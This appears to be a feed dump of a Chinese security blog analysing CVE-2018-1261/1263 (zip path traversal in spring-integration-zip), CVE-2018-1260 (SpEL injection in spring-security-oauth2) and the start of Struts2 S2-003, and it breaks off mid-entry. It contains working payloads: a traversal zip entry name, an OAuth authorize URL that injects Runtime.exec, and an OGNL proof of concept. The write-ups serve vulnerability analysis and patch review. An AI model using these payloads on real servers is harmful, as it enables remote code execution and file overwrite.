<p>在iterate中，通过<code>in = new ZipInputStream(new BufferedInputStream(is));</code>生成了ZipInputStream对象<code>in</code>，此后通过<code>in.getNextEntry()</code>来获取对象in中的一个个条目。对于<code>getNextEntry()</code>而已，它会直接把目录给打印出来，具体可以参见<a href="https://stackoverflow.com/questions/11784102/how-does-zipinputstream-getnextentry-work" target="_blank" rel="external">stackoverflow: How does ZipInputStream.getNextEntry() work?</a>。所以对于<code>zip-malicious-traversal.zip</code>而言</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180512/4.png?raw=true" alt=""></p>
<p>回到UnZipTransformer.java：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180512/3.png?raw=true" alt=""></p>
<p>可以看到<code>entry</code>的值即为<code>../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../tmp/evil.txt</code>。</p>
<p>此后调用回调函数process:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(InputStream zipEntryInputStream, ZipEntry zipEntry)</span> <span class="keyword">throws</span> IOException </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">final</span> String zipEntryName = zipEntry.getName();</div><div class="line">    ...</div><div class="line">    <span class="keyword">if</span> (ZipResultType.FILE.equals(zipResultType)) &#123;</div><div class="line">        <span class="keyword">final</span> File tempDir = <span class="keyword">new</span> File(workDirectory, message.getHeaders().getId().toString());</div><div class="line">        tempDir.mkdirs(); <span class="comment">//NOSONAR false positive</span></div><div class="line">        <span class="keyword">final</span> File destinationFile = <span class="keyword">new</span> File(tempDir, zipEntryName);</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (zipEntry.isDirectory()) &#123; ...   &#125;</div><div class="line">        <span class="keyword">else</span> &#123;</div><div class="line">            SpringZipUtils.copy(zipEntryInputStream, destinationFile);</div><div class="line">            uncompressedData.put(zipEntryName, destinationFile);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>tempDir</code>是临时生成的文件夹，而<code>zipEntryName</code>通过<code>zipEntry.getName()</code>得到，即为<code>../../../</code>那一串。接着通过<code>final File destinationFile = new File(tempDir, zipEntryName);</code>确定解压目录，也正是这里造成了跨越目录漏洞。接着就是调用<code>copy</code>把数据写到destinationFile处。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180512/5.png?raw=true" alt=""></p>
<p>究其原因，对于getNextEntry而言,<code>../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../tmp</code>仅仅是目录名字，而对于copy操作而言，<code>../../../</code>等将被解释为目录穿越操作从而造成了任意解压。</p>
<h1 id="补丁浅析"><a href="#补丁浅析" class="headerlink" title="补丁浅析"></a>补丁浅析</h1><p>1.0.1.RELEASE中的补丁 <a href="https://github.com/spring-projects/spring-integration-extensions/commit/a5573eb232ff85199ff9bb28993df715d9a19a25" target="_blank" rel="external">Disallow traversal entity in zip</a>，主要是在进行copy操作前，对zipEntryName进行了检查<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">    <span class="keyword">if</span> (zipEntryName.contains(<span class="string">".."</span>) &amp;&amp; !destinationFile.getCanonicalPath().startsWith(workDirectory.getCanonicalPath())) &#123;</div><div class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ZipException(<span class="string">"The file "</span> + zipEntryName + <span class="string">" is trying to leave the target output directory of "</span> + workDirectory);</div><div class="line">    &#125;</div><div class="line">```           </div><div class="line"></div><div class="line">对于恶意的压缩包，假设`destinationFile`值为`.\here\e401f4b8-<span class="number">0</span>ecb-<span class="number">3f</span>3a-<span class="number">76</span>ce-<span class="number">5318</span>b14d6000\..\..\tmp\evil.txt`时，通过调用`destinationFile.getCanonicalPath()`把``.`和`..`解析成对应的正确的路径，获得它规范化的绝对路径。之后再与工作目录`workDirectory.getCanonicalPath()`比较来确定是否存在目录穿越。</div><div class="line"></div><div class="line">对于恶意的压缩包，在生成了`destinationFile`后，假设值为`.\here\e401f4b8-<span class="number">0</span>ecb-<span class="number">3f</span>3a-<span class="number">76</span>ce-<span class="number">5318</span>b14d6000\..\..\tmp\evil.txt`时，通过调用`destinationFile.getCanonicalPath()`把``.`和`..`解析成对应的正确的路径，获得它规范化的绝对路径。之后再与工作目录`workDirectory.getCanonicalPath()`比较来确定是否存在目录穿越。</div><div class="line"></div><div class="line">之后，<span class="number">2018</span>年<span class="number">5</span>月<span class="number">11</span>日pivotal又再次放出公告：</div><div class="line">![<span class="number">11</span>.png](https:<span class="comment">//github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180512/11.png?raw=true)</span></div><div class="line"></div><div class="line">原因在于：</div></pre></td></tr></table></figure></p>
<p>While the framework itself now does not write such files, it does present the errant path to the user application, which could inadvertently write the file using that path.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">也就是说，生成的`destinationFile`其实是错误的，尽管框架本身不会有问题不会出现目录遍历漏洞，但是对于应用而言，可能之后直接使用了`destinationFile`这个路径来进行操作从而导致错误。因此在1.0.2.RELEASE版本中的补丁中[[Dissallow traversal entry even for byte[]](https://github.com/spring-projects/spring-integration-extensions/commit/d10f537283d90eabd28af57ac97f860a3913bf9b)，直接在生成`destinationFile`时做了检查：</div><div class="line"></div><div class="line">```java </div><div class="line">final File destinationFile = checkPath(message, zipEntryName);</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180512/7.png?raw=true" alt="7.png"></p>
<p>除此之外，在 <a href="https://github.com/spring-projects/spring-integration-extensions/commit/8d1752cb98f40abe521cc35884efe68c577b64eb" target="_blank" rel="external">Remove unnecessary check for the <code>..</code></a>中还将<code>zipEntryName.contains(&quot;..&quot;)</code>的判断删除，因为认为是不必要的。</p>
<h1 id="漏洞考古"><a href="#漏洞考古" class="headerlink" title="漏洞考古"></a>漏洞考古</h1><p>类似的压缩文件目录遍历漏洞以前也出现不少，列举几个。</p>
<ul>
<li><a href="https://www.nowsecure.com/blog/2015/06/16/remote-code-execution-as-system-user-on-samsung-phones/" target="_blank" rel="external">安卓：三星默认输入法远程代码执行</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180512/8.png?raw=true" alt=""></li>
<li><a href="https://ajinabraham.com/blog/exploiting-insecure-file-extraction-in-python-for-code-execution" target="_blank" rel="external">Python：Exploiting insecure file extraction in Python for code execution</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180512/9.png?raw=true" alt=""></li>
<li><a href="http://blog.knownsec.com/2016/11/gnu-tar-extract-pathname-bypass-cve-2016-6321/" target="_blank" rel="external">GNU tar 解压路径绕过漏洞</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180512/10.png?raw=true" alt=""></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2334&quot;&gt;Unsafe Unzip with spring-integration-zip 分析-【CVE-2018-1261 与 CVE-2018-1263】&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
    
      <category term="spring" scheme="http://chybeta.github.io/tags/spring/"/>
    
      <category term="加压缩" scheme="http://chybeta.github.io/tags/%E5%8A%A0%E5%8E%8B%E7%BC%A9/"/>
    
  </entry>
  
  <entry>
    <title>RCE with spring-security-oauth2 分析-【CVE-2018-1260】</title>
    <link href="http://chybeta.github.io/2018/05/12/RCE-with-spring-security-oauth2-%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-1260%E3%80%91/"/>
    <id>http://chybeta.github.io/2018/05/12/RCE-with-spring-security-oauth2-分析-【CVE-2018-1260】/</id>
    <published>2018-05-11T23:30:38.000Z</published>
    <updated>2018-07-05T00:33:25.680Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2330" target="_blank" rel="external">RCE with spring-security-oauth2 分析-【CVE-2018-1260】</a><br><a id="more"></a></p>
<h1 id="漏洞公告"><a href="#漏洞公告" class="headerlink" title="漏洞公告"></a>漏洞公告</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180511/1.png?raw=true" alt=""></p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>利用github上已有的demo：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/wanghongfei/spring-security-oauth2-example.git</div></pre></td></tr></table></figure></p>
<p>确保导入的spring-security-oauth2为受影响版本，以这里为例为2.0.10<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180511/2.png?raw=true" alt=""></p>
<p>进入spring-security-oauth2-example，修改 cn/com/sina/alan/oauth/config/OAuthSecurityConfig.java的第67行:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@Override</span></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">configure</span><span class="params">(ClientDetailsServiceConfigurer clients)</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">   clients.inMemory()</div><div class="line">            .withClient(<span class="string">"client"</span>)</div><div class="line">            .authorizedGrantTypes(<span class="string">"authorization_code"</span>)</div><div class="line">            .scopes();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>根据<a href="https://github.com/wanghongfei/spring-security-oauth2-example.git" target="_blank" rel="external">spring-security-oauth2-example</a>创建对应的数据库等并修改AlanOAuthApplication中对应的mysql相关配置信息。</p>
<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:8080/oauth/authorize?client_id=client&amp;response_type=code&amp;redirect_uri=http://www.github.com/chybeta&amp;scope=%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22calc.exe%22%29%7D</div></pre></td></tr></table></figure></p>
<p>会重定向到login页面，随意输入username和password，点击login，触发payload。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180511/3.gif?raw=true" alt=""></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>先简要补充一下关于OAuth2.0的相关知识。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180511/4.png?raw=true" alt=""></p>
<p>以上图为例。当用户使用客户端时，客户端要求授权，即图中的AB。接着客户端通过在B中获得的授权向认证服务器申请令牌，即access token。最后在EF阶段，客户端带着access token向资源服务器请求并获得资源。</p>
<p>在获得access token之前，客户端需要获得用户的授权。根据标准，有四种授权方式：授权码模式（authorization code）、简化模式（implicit）、密码模式（resource owner password credentials）、客户端模式（client credentials）。在这几种模式中，当客户端将用户导向认证服务器时，都可以带上一个可选的参数<code>scope</code>，这个参数用于表示客户端申请的权限的范围。</p>
<p>，根据<a href="http://projects.spring.io/spring-security-oauth/docs/oauth2.html" target="_blank" rel="external">官方文档</a>，在spring-security-oauth的默认配置中scope参数默认为空：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">scope: The scope to which the client is limited. If scope is undefined or empty (the default) the client is not limited by scope.</div></pre></td></tr></table></figure></p>
<p>为明白起见，我们在demo中将其清楚写出：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">clients.inMemory()</div><div class="line">        .withClient(<span class="string">"client"</span>)</div><div class="line">        .authorizedGrantTypes(<span class="string">"authorization_code"</span>)</div><div class="line">        .scopes();</div></pre></td></tr></table></figure></p>
<p>接着开始正式分析。当我们访问<code>http://localhost:8080/oauth/authorize</code>重定向至<code>http://localhost:8080/login</code>并完成login后程序流程到达<br>org/springframework/security/oauth2/provider/endpoint/AuthorizationEndpoint.java，这里贴上部分代码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@RequestMapping</span>(value = <span class="string">"/oauth/authorize"</span>)</div><div class="line"><span class="function"><span class="keyword">public</span> ModelAndView <span class="title">authorize</span><span class="params">(Map&lt;String, Object&gt; model, @RequestParam Map&lt;String, String&gt; parameters,</span></span></div><div class="line">        SessionStatus sessionStatus, Principal principal) &#123;</div><div class="line"></div><div class="line">    <span class="comment">// Pull out the authorization request first, using the OAuth2RequestFactory. All further logic should</span></div><div class="line">    <span class="comment">// query off of the authorization request instead of referring back to the parameters map. The contents of the</span></div><div class="line">    <span class="comment">// parameters map will be stored without change in the AuthorizationRequest object once it is created.</span></div><div class="line">    AuthorizationRequest authorizationRequest = getOAuth2RequestFactory().createAuthorizationRequest(parameters);</div><div class="line"></div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        ...</div><div class="line">        <span class="comment">// We intentionally only validate the parameters requested by the client (ignoring any data that may have</span></div><div class="line">        <span class="comment">// been added to the request by the manager).</span></div><div class="line">        oauth2RequestValidator.validateScope(authorizationRequest, client);</div><div class="line">        ...</div><div class="line"></div><div class="line">        <span class="comment">// Place auth request into the model so that it is stored in the session</span></div><div class="line">        <span class="comment">// for approveOrDeny to use. That way we make sure that auth request comes from the session,</span></div><div class="line">        <span class="comment">// so any auth request parameters passed to approveOrDeny will be ignored and retrieved from the session.</span></div><div class="line">        model.put(<span class="string">"authorizationRequest"</span>, authorizationRequest);</div><div class="line"></div><div class="line">        <span class="keyword">return</span> getUserApprovalPageResponse(model, authorizationRequest, (Authentication) principal);</div><div class="line"></div><div class="line">    &#125;</div><div class="line">    ...</div></pre></td></tr></table></figure></p>
<p>第115行<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180511/5.png?raw=true" alt=""></p>
<p>在执行完<code>AuthorizationRequest authorizationRequest = ...</code>后，<code>authorizationRequest</code>代表了要认证的请求，其中包含了众多参数<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180511/6.png?raw=true" alt=""></p>
<p>在经过了对一些参数的处理，比如RedirectUri等，之后到达第156行：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// We intentionally only validate the parameters requested by the client (ignoring any data that may have</span></div><div class="line"><span class="comment">// been added to the request by the manager).</span></div><div class="line">oauth2RequestValidator.validateScope(authorizationRequest, client);</div></pre></td></tr></table></figure></p>
<p>在这里将对<code>scope</code>参数进行验证。跟入<code>validateScope</code>到org/springframework/security/oauth2/provider/request/DefaultOAuth2RequestValidator.java:19<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DefaultOAuth2RequestValidator</span> <span class="keyword">implements</span> <span class="title">OAuth2RequestValidator</span> </span>&#123;</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">validateScope</span><span class="params">(AuthorizationRequest authorizationRequest, ClientDetails client)</span> <span class="keyword">throws</span> InvalidScopeException </span>&#123;</div><div class="line">		validateScope(authorizationRequest.getScope(), client.getScope());</div><div class="line">	&#125;</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>继续跟入<code>validateScope</code>，至 org/springframework/security/oauth2/provider/request/DefaultOAuth2RequestValidator.java:28<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">validateScope</span><span class="params">(Set&lt;String&gt; requestScopes, Set&lt;String&gt; clientScopes)</span> </span>&#123;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (clientScopes != <span class="keyword">null</span> &amp;&amp; !clientScopes.isEmpty()) &#123;</div><div class="line">		<span class="keyword">for</span> (String scope : requestScopes) &#123;</div><div class="line">			<span class="keyword">if</span> (!clientScopes.contains(scope)) &#123;</div><div class="line">				<span class="keyword">throw</span> <span class="keyword">new</span> InvalidScopeException(<span class="string">"Invalid scope: "</span> + scope, clientScopes);</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	<span class="keyword">if</span> (requestScopes.isEmpty()) &#123;</div><div class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> InvalidScopeException(<span class="string">"Empty scope (either the client or the user is not allowed the requested scopes)"</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>首先检查<code>clientScopes</code>，这个<code>clientScopes</code>即我们在前面configure中配置的<code>.scopes();</code>，倘若不为空，则进行白名单检查。举个例子，如果前面配置<code>.scopes(&quot;chybeta&quot;);</code>，则传入<code>requestScopes</code>必须为<code>chybeta</code>，否则会直接抛出异常<code>Invalid scope:xxx</code>。但由于此处查<code>clientScopes</code>为空值，则接下来仅仅做了<code>requestScopes.isEmpty()</code>的检查并且通过。</p>
<p>在完成了各项检查和配置后，在<code>authorize</code>函数的最后执行：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">return</span> getUserApprovalPageResponse(model, authorizationRequest, (Authentication) principal);</div></pre></td></tr></table></figure></p>
<p>回想一下前面OAuth2.0的流程，在客户端请求授权（A），用户登陆认证（B）后，将会进行用户授权（C），这里即开始进行正式的授权阶段。跟入<code>getUserApprovalPageResponse</code> 至org/springframework/security/oauth2/provider/endpoint/AuthorizationEndpoint.java:241：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180511/7.png?raw=true" alt=""></p>
<p>生成对应的model和view，之后将会forward到<code>/oauth/confirm_access</code>。为简单起见，我省略中间过程，直接定位到org/springframework/security/oauth2/provider/endpoint/WhitelabelApprovalEndpoint.java:20<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WhitelabelApprovalEndpoint</span> </span>&#123;</div><div class="line"></div><div class="line">	<span class="meta">@RequestMapping</span>(<span class="string">"/oauth/confirm_access"</span>)</div><div class="line">	<span class="function"><span class="keyword">public</span> ModelAndView <span class="title">getAccessConfirmation</span><span class="params">(Map&lt;String, Object&gt; model, HttpServletRequest request)</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">		String template = createTemplate(model, request);</div><div class="line">		<span class="keyword">if</span> (request.getAttribute(<span class="string">"_csrf"</span>) != <span class="keyword">null</span>) &#123;</div><div class="line">			model.put(<span class="string">"_csrf"</span>, request.getAttribute(<span class="string">"_csrf"</span>));</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">return</span> <span class="keyword">new</span> ModelAndView(<span class="keyword">new</span> SpelView(template), model);</div><div class="line">	&#125;</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>跟入<code>createTemplate</code>，第29行：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">protected</span> String <span class="title">createTemplate</span><span class="params">(Map&lt;String, Object&gt; model, HttpServletRequest request)</span> </span>&#123;</div><div class="line">    String template = TEMPLATE;</div><div class="line">    <span class="keyword">if</span> (model.containsKey(<span class="string">"scopes"</span>) || request.getAttribute(<span class="string">"scopes"</span>) != <span class="keyword">null</span>) &#123;</div><div class="line">        template = template.replace(<span class="string">"%scopes%"</span>, createScopes(model, request)).replace(<span class="string">"%denial%"</span>, <span class="string">""</span>);</div><div class="line">    &#125;</div><div class="line">    ...</div><div class="line">    <span class="keyword">return</span> template;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>跟入<code>createScopes</code>，第46行：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180511/8.png?raw=true" alt=""></p>
<p>这里获取到了<code>scopes</code>，并且通过for循环生成对应的<code>builder</code>，其实就是html和一些标签等，最后返回的即<code>builder.toString()</code>,其值如下:<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;ul&gt;&lt;li&gt;&lt;div class='form-group'&gt;scope.$&#123;T(java.lang.Runtime).getRuntime().exec("calc.exe")&#125;: &lt;input type='radio' name='scope.$&#123;T(java.lang.Runtime).getRuntime().exec("calc.exe")&#125;' value='true'&gt;Approve&lt;/input&gt; &lt;input type='radio' name='scope.$&#123;T(java.lang.Runtime).getRuntime().exec("calc.exe")&#125;' value='false' checked&gt;Deny&lt;/input&gt;&lt;/div&gt;&lt;/li&gt;&lt;/ul&gt;</div></pre></td></tr></table></figure></p>
<p><code>createScopes</code>结束后将会把上述<code>builder.toString()</code>拼接到<code>template</code>中。<code>createTemplate</code>结束后，在<code>getAccessConfirmation</code>的最后：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">return</span> <span class="keyword">new</span> ModelAndView(<span class="keyword">new</span> SpelView(template), model);</div></pre></td></tr></table></figure></p>
<p>根据<code>template</code>生成对应的<code>SpelView</code>对象，这是其构造函数：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180511/9.png?raw=true" alt=""></p>
<p>此后在页面渲染的过程中，将会执行页面中的Spel表达式<code>${T(java.lang.Runtime).getRuntime().exec(&quot;calc.exe&quot;)}</code>从而造成代码执行。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180511/10.png?raw=true" alt=""></p>
<p>所以综上所述，这个任意代码执行的利用条件实在“苛刻”：</p>
<ol>
<li>需要<code>scopes</code>没有配置白名单，否则直接<code>Invalid scope:xxx</code>。不过大部分OAuth都会限制授权的范围，即指定scopes。</li>
<li>使用了默认的Approval Endpoint，生成对应的template，在spelview中注入spel表达式。不过可能绝大部分使用者都会重写这部分来满足自己的需求，从而导致spel注入不成功。</li>
</ol>
<h1 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h1><p>commit记录： <a href="https://github.com/spring-projects/spring-security-oauth/commit/adb1e6d19c681f394c9513799b81b527b0cb007c" target="_blank" rel="external">https://github.com/spring-projects/spring-security-oauth/commit/adb1e6d19c681f394c9513799b81b527b0cb007c</a></p>
<p>官方将<code>SpelView</code>去除，使用其他方法来生成对应的视图<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180511/11.png?raw=true" alt=""></p>
<h1 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h1><ul>
<li><a href="https://pivotal.io/security/cve-2018-1260" target="_blank" rel="external">CVE-2018-1260: Remote Code Execution with spring-security-oauth2</a></li>
<li><a href="http://projects.spring.io/spring-security-oauth/docs/oauth2.html#Configuring%20Client%20Details" target="_blank" rel="external">spring-security-oauth:Authorization Server Configuration</a></li>
<li><a href="http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html" target="_blank" rel="external">阮一峰:理解OAuth 2.0</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2330&quot;&gt;RCE with spring-security-oauth2 分析-【CVE-2018-1260】&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
    
      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="spring" scheme="http://chybeta.github.io/tags/spring/"/>
    
  </entry>
  
  <entry>
    <title>【struts2 命令/代码执行漏洞分析系列】S2-003和S3-005</title>
    <link href="http://chybeta.github.io/2018/05/08/%E3%80%90struts2-%E5%91%BD%E4%BB%A4-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E3%80%91S2-003%E5%92%8CS3-005/"/>
    <id>http://chybeta.github.io/2018/05/08/【struts2-命令-代码执行漏洞分析系列】S2-003和S3-005/</id>
    <published>2018-05-07T23:45:08.000Z</published>
    <updated>2018-05-07T23:58:28.897Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2323" target="_blank" rel="external">阿里先知安全社区：【struts2 命令/代码执行漏洞分析系列】S2-003和S3-005</a><br><a id="more"></a></p>
<h1 id="S2-003"><a href="#S2-003" class="headerlink" title="S2-003"></a>S2-003</h1><h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>漏洞信息页面： <a href="https://cwiki.apache.org/confluence/display/WW/S2-003" target="_blank" rel="external">https://cwiki.apache.org/confluence/display/WW/S2-003</a></p>
<p>漏洞成因官方概述：XWork ParameterInterceptors bypass allows OGNL statement execution</p>
<p>漏洞影响：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/1.png?raw=true" alt=""></p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>s2-003漏洞的payload用到了特殊字符，在高版本tomcat中会失败，需要使用tomcat6来测试。我使用的是6.0.9版本。此外导入的struts版本为2.0.11.2</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>POC:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(&apos;\u0023context[\&apos;xwork.MethodAccessor.denyMethodExecution\&apos;]\u003dfalse&apos;)(bla)(bla)&amp;(&apos;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\&apos;calc\&apos;)&apos;)(bla)(bla)</div></pre></td></tr></table></figure></p>
<p>回显：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div 